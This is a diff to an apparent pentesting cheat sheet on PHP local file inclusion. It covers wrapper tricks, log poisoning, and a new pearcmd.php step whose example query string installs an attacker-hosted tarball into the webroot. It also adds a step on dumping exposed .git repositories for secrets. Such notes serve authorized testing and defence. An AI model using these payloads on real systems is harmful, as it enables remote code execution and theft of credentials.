@@ -33,7 +33,14 @@ sequences escape the intended directory. If the value is `include`d (PHP), inclu
 3. **PHP wrappers → source/RCE**: `php://filter/convert.base64-encode/resource=index.php`
    (read source), `data://`/`expect://`, and **log poisoning** (write PHP into a log via
    User-Agent, then include the log) or session/`/proc/self/environ` inclusion for RCE.
-4. **Enumerate targets**: config files, keys, app source, history files; `ffuf` a LFI wordlist.
+4. **PEAR `pearcmd.php` LFI→RCE** (very common on PHP hosts with `register_argc_argv=On` and PEAR
+   installed): include `/usr/local/lib/php/pearcmd.php` and pass args via the query string, e.g.
+   `?file=/usr/local/lib/php/pearcmd.php&+install+--installroot=/var/www/html+<attacker.tgz-URL>`
+   to write attacker-controlled content into the webroot, then request it. The trick is that
+   `register_argc_argv` lets `pearcmd` read `argv` from the URL query — no upload needed.
+5. **Enumerate targets**: config files, keys, app source, history files, and an exposed
+   `/.git/` (grab `.git/HEAD`/`config` → dump the repo → `git log -p` for deleted secrets);
+   `ffuf` a LFI wordlist.
 
 ## Gotchas
 - A forced extension (`include $p.".php"`) blocks arbitrary read → try wrappers or null byte (old PHP).
